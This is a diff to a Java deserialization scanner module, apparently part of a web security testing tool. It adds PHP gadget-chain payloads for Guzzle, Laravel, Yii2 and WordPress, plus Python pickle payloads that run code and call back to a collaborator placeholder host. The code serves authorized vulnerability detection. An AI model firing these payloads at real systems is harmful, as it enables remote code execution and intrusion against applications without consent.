@@ -1934,11 +1934,38 @@ public class DeserializationScanner implements ScanModule {
                                 + "s:8:\"\0*\0level\";N;s:14:\"\0*\0initialized\";b:1;"
                                 + "s:14:\"\0*\0bufferLimit\";i:-1;s:13:\"\0*\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}",
                         "Monolog SocketHandler OOB"});
-                // (Removed: GuzzleHttp\Psr7\Uri — value object, no magic method triggers URL fetch)
-                // (Removed: Laravel PendingBroadcast — Illuminate\Http\Client\Request doesn't have dispatch())
-                // (Removed: Symfony Process — __destruct calls stop(), not run(); command never executes)
-                // (Removed: SwiftMailer — transport doesn't auto-connect on deserialization)
-                // (Removed: SplFileObject — not serializable in a way that triggers URL fetch)
+                // Guzzle FnStream → SoapClient: __destruct() calls _fn_close callback → SoapClient.__call() → HTTP
+                // Requires guzzlehttp/psr7 (very common via Composer). FnStream.__wakeup() throws but __destruct() still fires.
+                oobTemplateList.add(new String[]{
+                        "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";"
+                                + "a:1:{s:5:\"close\";s:4:\"fake\";}s:9:\"_fn_close\";a:2:{i:0;"
+                                + "O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
+                                + ("http://COLLAB_PLACEHOLDER/guzzle".length())
+                                + ":\"http://COLLAB_PLACEHOLDER/guzzle\";}i:1;s:1:\"x\";}}",
+                        "Guzzle FnStream + SoapClient OOB"});
+                // Laravel PendingBroadcast → SoapClient: __destruct() → dispatch() → SoapClient.__call() → HTTP
+                // Uses SoapClient as the events dispatcher (its __call catches any method invocation)
+                oobTemplateList.add(new String[]{
+                        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";"
+                                + "O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
+                                + ("http://COLLAB_PLACEHOLDER/laravel".length())
+                                + ":\"http://COLLAB_PLACEHOLDER/laravel\";}s:8:\"\0*\0event\";s:1:\"x\";}",
+                        "Laravel PendingBroadcast + SoapClient OOB"});
+                // Yii2 BatchQueryResult → SoapClient: __destruct() → reset() → _dataReader->close() → __call() → HTTP
+                oobTemplateList.add(new String[]{
+                        "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\0yii\\db\\BatchQueryResult\0_dataReader\";"
+                                + "O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
+                                + ("http://COLLAB_PLACEHOLDER/yii".length())
+                                + ":\"http://COLLAB_PLACEHOLDER/yii\";}}",
+                        "Yii2 BatchQueryResult + SoapClient OOB"});
+                // WordPress WP_HTML_Token → SoapClient: __destruct() → call_user_func(on_destroy) → __call() → HTTP
+                // Requires WordPress 6.2+ (WP_HTML_Token class)
+                oobTemplateList.add(new String[]{
+                        "O:13:\"WP_HTML_Token\":2:{s:13:\"bookmark_name\";s:1:\"x\";s:10:\"on_destroy\";"
+                                + "a:2:{i:0;O:10:\"SoapClient\":2:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
+                                + ("http://COLLAB_PLACEHOLDER/wp".length())
+                                + ":\"http://COLLAB_PLACEHOLDER/wp\";}i:1;s:1:\"x\";}}",
+                        "WordPress WP_HTML_Token + SoapClient OOB"});
                 break;
             case "Python":
                 // Pickle os.system — nslookup/curl/wget
@@ -1959,6 +1986,10 @@ public class DeserializationScanner implements ScanModule {
                 // jsonpickle with os.system
                 oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"nslookup COLLAB_PLACEHOLDER\"]}]}", "jsonpickle nslookup"});
                 oobTemplateList.add(new String[]{"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"curl http://COLLAB_PLACEHOLDER/jp\"]}]}", "jsonpickle curl"});
+                // Pickle exec + requests library (common in Python web apps, requires 'requests' package)
+                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import requests;requests.get(\"http://COLLAB_PLACEHOLDER/pyreq\")'\ntR.", "Pickle exec requests OOB"});
+                // Pickle exec + http.client (Python stdlib, no external dependencies needed)
+                oobTemplateList.add(new String[]{"cbuiltins\nexec\n(S'import http.client;http.client.HTTPConnection(\"COLLAB_PLACEHOLDER\").request(\"GET\",\"/\")'\ntR.", "Pickle exec http.client OOB"});
                 break;
             case "Ruby":
                 // Ruby YAML Gem::Source — @uri triggers HTTP fetch on fetch_spec/download_spec
@@ -2069,6 +2100,13 @@ public class DeserializationScanner implements ScanModule {
             if (collabPayload == null) continue;
 
             String payload = payloadTemplate.replace("COLLAB_PLACEHOLDER", collabPayload);
+
+            // Fix PHP serialized string lengths after COLLAB_PLACEHOLDER replacement.
+            // PHP unserialize() requires exact byte lengths in s:XX:"..." format.
+            // Template uses COLLAB_PLACEHOLDER (18 chars) but actual Collaborator domain varies.
+            if ("PHP".equals(dp.language)) {
+                payload = fixPhpSerializedLengths(payload);
+            }
 
             // Try multiple encodings
             String[] encodedPayloads = {
@@ -2472,6 +2510,25 @@ public class DeserializationScanner implements ScanModule {
             if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
         } catch (Exception ignored) {}
         return url;
+    }
+
+    /**
+     * Recalculates PHP serialized string lengths (s:XX:"...") after placeholder replacement.
+     * PHP's unserialize() requires exact byte lengths — when COLLAB_PLACEHOLDER (18 chars) is
+     * replaced with the actual Collaborator domain (variable length), s:XX prefixes become wrong.
+     * Only matches string entries (s:), not objects (O:) or arrays (a:).
+     */
+    private static String fixPhpSerializedLengths(String serialized) {
+        java.util.regex.Matcher m = java.util.regex.Pattern.compile("s:(\\d+):\"([^\"]*)\"")
+                .matcher(serialized);
+        StringBuilder sb = new StringBuilder();
+        while (m.find()) {
+            String value = m.group(2);
+            m.appendReplacement(sb, java.util.regex.Matcher.quoteReplacement(
+                    "s:" + value.length() + ":\"" + value + "\""));
+        }
+        m.appendTail(sb);
+        return sb.toString();
     }
 
     /**
